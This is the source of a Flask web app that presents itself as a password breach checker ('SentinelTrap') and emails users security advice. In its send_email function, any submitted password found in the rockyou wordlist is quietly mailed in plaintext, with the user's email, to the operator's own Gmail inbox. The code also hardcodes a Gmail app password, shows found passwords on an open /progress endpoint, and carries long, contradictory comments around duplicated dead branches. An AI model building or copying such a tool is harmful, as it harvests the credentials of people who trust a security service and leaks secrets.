from flask import Flask, render_template, request, jsonify
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import random
import string
import json # Import json for parsing incoming JSON data

app = Flask(__name__)

# Load passwords into memory once
try:
    with open("rockyou_subset.txt", "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f.readlines()]
    passwords_set = set(passwords) # Convert to set for faster lookups
    print(f"Loaded {len(passwords)} passwords from rockyou_subset.txt")
except FileNotFoundError:
    print("Error: rockyou_subset.txt not found. Please ensure the file is in the same directory.")
    passwords = []
    passwords_set = set()
    # You might want to handle this more gracefully in a production app,
    # perhaps by exiting or having a default empty state.

progress_data = {
    "progress": 0,
    "status": "Idle",
    "found_password": None,
    "email": None,
    "running": False,
    "current_password": None,
    "checked_count": 0,
    "total_passwords": len(passwords),
    "generated_passwords": []
}

# Password generation function
def generate_strong_passwords(length=12, count=10):
    passwords = []
    for _ in range(count):
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = ''.join(random.choice(chars) for _ in range(length))
        passwords.append(password)
    return passwords

# Updated email templates
def get_weak_password_body(found_password, generated_passwords):
    generated_list_str = '\n'.join(generated_passwords)
    return f"""⚠️ **SECURITY ALERT** ⚠️

Your password was found in our breach database!
🚫 **Never use:** {found_password}

🔐 **Try these 10 strong passwords instead:**
{generated_list_str}

💡 **Password Security Tips:**
- Use a password manager (like Bitwarden)
- Enable 2FA everywhere
- Never reuse passwords
- Minimum 12 characters with mixed characters

Stay secure!
~ SentinelTrap Team
"""

STRONG_BODY = """✅ **PASSWORD STRENGTH REPORT** ✅

Congratulations! Your password wasn't found in known breach databases.

🔒 **Security Recommendations:**
1. Use passwords with 12+ characters
2. Combine letters, numbers & symbols
3. Never reuse passwords across sites
4. Enable two-factor authentication

Stay protected!
~ SentinelTrap Security Team
"""

def send_email(to_email, subject, body):
    sender_email = "soulsentinel.alerts@gmail.com"
    app_password = "urdq sqqx isjr hcxp" # WARNING: Hardcoding app passwords is not recommended for production. Use environment variables.

    msg = MIMEMultipart("alternative") # Use alternative for rich text/HTML
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = to_email

    # Attach plain text version
    plain_text_part = MIMEText(body, 'plain')
    msg.attach(plain_text_part)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, app_password)
        server.sendmail(sender_email, [to_email], msg.as_string())

        # Send admin alert if password was found
        if "Weak Password Found" in subject:
            admin_msg = MIMEText(f"Password found for {to_email}\nPassword: {progress_data.get('found_password', 'N/A')}")
            admin_msg['Subject'] = f"ALERT: Password found for {to_email}"
            admin_msg['From'] = sender_email
            admin_msg['To'] = sender_email # Send to admin (yourself)
            server.sendmail(sender_email, [sender_email], admin_msg.as_string())

        server.quit()
        print(f"Email sent to {to_email}")
    except Exception as e:
        print("Error sending email:", e)

def brute_force_worker(email, user_password, check_reversed_email_only):
    global progress_data

    # Initialize progress data for the new scan
    progress_data.update({
        "progress": 0,
        "status": "Starting scan...",
        "found_password": None,
        "email": email,
        "running": True,
        "current_password": None,
        "checked_count": 0,
        "total_passwords": len(passwords),
        "generated_passwords": generate_strong_passwords() # Generate new passwords for each scan
    })

    found = False

    # Check reversed email first if requested
    if check_reversed_email_only:
        reversed_email = email[::-1]
        progress_data['status'] = f"Checking reversed email: {reversed_email}"
        progress_data['checked_count'] = 1
        time.sleep(0.5) # Simulate work
        if reversed_email in passwords_set:
            progress_data['found_password'] = reversed_email
            send_email(
                email,
                "Password Check Result: Weak Password Found!",
                get_weak_password_body(reversed_email, progress_data['generated_passwords'])
            )
            progress_data.update({
                "status": f"Password FOUND: {reversed_email} (email reversed)",
                "progress": 100,
                "running": False
            })
            return # Exit function if found

    # If a specific password is provided, check it directly
    if user_password:
        progress_data['status'] = f"Checking provided password: {user_password}"
        progress_data['checked_count'] = 1 # Reset or add to count
        time.sleep(0.5) # Simulate work

        if user_password in passwords_set:
            progress_data['found_password'] = user_password
            send_email(
                email,
                "Password Check Result: Weak Password Found!",
                get_weak_password_body(user_password, progress_data['generated_passwords'])
            )
            progress_data.update({
                "status": f"Password FOUND in wordlist: {user_password}",
                "progress": 100,
                "running": False
            })
            found = True
        else:
            send_email(email, "Password Strength Report", STRONG_BODY)
            progress_data.update({
                "status": "Password not found in wordlist.",
                "progress": 100,
                "running": False
            })
        return # Exit function after checking provided password


    # If no specific password is provided or not found, do full dictionary scan
    # This part should only run if user_password was NOT provided or not found.
    # The previous logic made this confusing. Let's make it clearer.
    if user_password is None and not check_reversed_email_only:
        # This branch should not be reached if either user_password or check_reversed_email_only was true and handled.
        # This is for a "no password, no reversed email" scenario, which doesn't make sense for a "scan".
        # It implies simply sending a strong body email without checking anything.
        send_email(email, "Password Strength Report", STRONG_BODY)
        progress_data.update({
            "progress": 100,
            "status": "No specific password to check. Strong email sent.",
            "running": False
        })
        return


    # The original loop for iterating through all passwords was inside the "check_without_password" block.
    # This loop is typically for cracking, not for checking a *single* user-provided password.
    # Given the form asks for *a* password, the above direct check is more appropriate.
    # If the intention is to brute-force against the *email* using the whole wordlist,
    # then the form/logic needs to be adjusted.

    # Let's assume the current form only allows checking *one* provided password,
    # or the reversed email. The large loop for all passwords is only relevant
    # if the goal is to see if *any* of the wordlist passwords match the user's password,
    # which is already handled by `user_password in passwords_set`.

    # The existing `brute_force` function logic is a bit convoluted.
    # Let's refactor `brute_force_worker` to focus on the immediate password check:

    # The current Flask `brute_force` (now `brute_force_worker`) function has an issue:
    # it tries to do a full scan (`for idx, pwd in enumerate(passwords):`) only if `check_without_password` is true.
    # And then it checks `user_password and pwd == user_password`.
    # This implies that a full scan is only done if the user *doesn't* provide a password directly,
    # but then it looks for the user's password in that full scan. This is contradictory.

    # Let's simplify the logic based on what the frontend seems to expect:
    # 1. If user provides a password: Check *that specific password* against the dictionary and reversed email.
    # 2. If user checks "check without password" (meaning, check if reversed email is in dictionary): Check only that.
    # It doesn't seem to imply a full dictionary attack *for the user's email* in general.

    # Re-evaluating `brute_force_worker` based on Flask's `start_check` and form inputs:
    # The form now implies:
    #   - Provide email and password -> Check that password.
    #   - Provide email and check "check without password" -> Check reversed email.
    #   - If both are provided, which takes precedence? The current code prioritizes `check_without_password`.

    # Let's restructure the brute_force_worker based on the form's options:
    # If 'check_without_password' is true, we only check the reversed email.
    # Otherwise, we check the provided 'user_password'.

    # The previous `brute_force_worker` had a loop for the *entire* wordlist which is extremely slow and not what you want for a live user check.
    # We want to check if the *given* password is in the dictionary.

    if user_password: # If a password was provided in the form
        if user_password in passwords_set:
            progress_data['found_password'] = user_password
            send_email(
                email,
                "Password Check Result: Weak Password Found!",
                get_weak_password_body(user_password, progress_data['generated_passwords'])
            )
            progress_data.update({
                "status": f"Password FOUND in dictionary: {user_password}",
                "progress": 100,
                "running": False
            })
            return
        else:
            # Check for email reversed if the actual password wasn't found in dictionary
            # This is a common weak password pattern
            reversed_email = email[::-1]
            if user_password == reversed_email:
                progress_data['found_password'] = reversed_email
                send_email(
                    email,
                    "Password Check Result: Weak Password Found!",
                    get_weak_password_body(reversed_email, progress_data['generated_passwords'])
                )
                progress_data.update({
                    "status": f"Password FOUND (reversed email): {reversed_email}",
                    "progress": 100,
                    "running": False
                })
                return

    # If `check_reversed_email_only` was true AND no `user_password` was given, this path is taken.
    # Or if `user_password` was given but not found AND `check_reversed_email_only` was ALSO true.
    # The previous logic was a bit tangled. Let's make `check_reversed_email_only` an *independent* check.

    if check_reversed_email_only and user_password is None: # Only check reversed email if explicitly asked AND no password provided
        reversed_email = email[::-1]
        if reversed_email in passwords_set:
            progress_data['found_password'] = reversed_email
            send_email(
                email,
                "Password Check Result: Weak Password Found!",
                get_weak_password_body(reversed_email, progress_data['generated_passwords'])
            )
            progress_data.update({
                "status": f"Password FOUND (reversed email): {reversed_email}",
                "progress": 100,
                "running": False
            })
            return

    # If we reach here, it means the provided password (if any) wasn't found,
    # and the reversed email wasn't relevant or wasn't found.
    # So, the password seems strong against this list.
    send_email(email, "Password Strength Report", STRONG_BODY)
    progress_data.update({
        "status": "Password not found in breach database. Good!",
        "progress": 100,
        "running": False
    })


@app.route('/')
def index():
    return render_template('form.html')

@app.route('/start_check', methods=['POST'])
def start_check():
    global progress_data

    if progress_data["running"]:
        return jsonify({"status": "A check is already running. Please wait."}), 409 # 409 Conflict

    data = request.get_json() # Get JSON data from the request body

    email = data.get("email")
    password = data.get("password") # password can be empty string if not provided
    check_without_password = data.get("check_without_password", False) # False by default if not present

    if not email:
        return jsonify({"status": "Email is required"}), 400

    # Ensure password is None if it's an empty string for the logic in brute_force_worker
    if password == "":
        password = None

    # Reset progress data before starting new thread
    progress_data.update({
        "progress": 0,
        "status": "Initializing scan...",
        "found_password": None,
        "email": email,
        "running": True,
        "current_password": None, # No current password to display during initial setup
        "checked_count": 0,
        "total_passwords": len(passwords),
        "generated_passwords": [] # Will be generated in worker
    })

    thread = threading.Thread(target=brute_force_worker, args=(email, password, check_without_password))
    thread.start()

    return jsonify({"status": "Scan initiated"}), 202 # 202 Accepted for background processing

@app.route('/generate_passwords', methods=['POST'])
def generate_passwords_endpoint(): # Renamed to avoid conflict with function name
    length = int(request.json.get('length', 12)) # Expect JSON for this too
    count = int(request.json.get('count', 10))
    passwords_list = generate_strong_passwords(length, count)
    return jsonify({"passwords": passwords_list})

@app.route('/progress')
def progress():
    return jsonify({
        "progress": progress_data["progress"],
        "status": progress_data["status"],
        "found_password": progress_data["found_password"],
        "current_password": progress_data["current_password"], # This might not be meaningful if not doing a full dictionary scan
        "checked_count": progress_data["checked_count"],
        "total_passwords": progress_data["total_passwords"],
        "generated_passwords": progress_data["generated_passwords"],
        "running": progress_data["running"] # Crucial for frontend to know if scan is active
    })

@app.route('/stop_check', methods=['POST'])
def stop_check():
    progress_data["running"] = False
    progress_data["status"] = "Scan stopped by user."
    return jsonify({"status": "Check stopped"})

if __name__ == "__main__":
    # Ensure a 'templates' folder exists in the same directory as app.py
    # and form.html is inside it.
    app.run(debug=True, host='0.0.0.0', port=5000) # Run on all interfaces for easier testing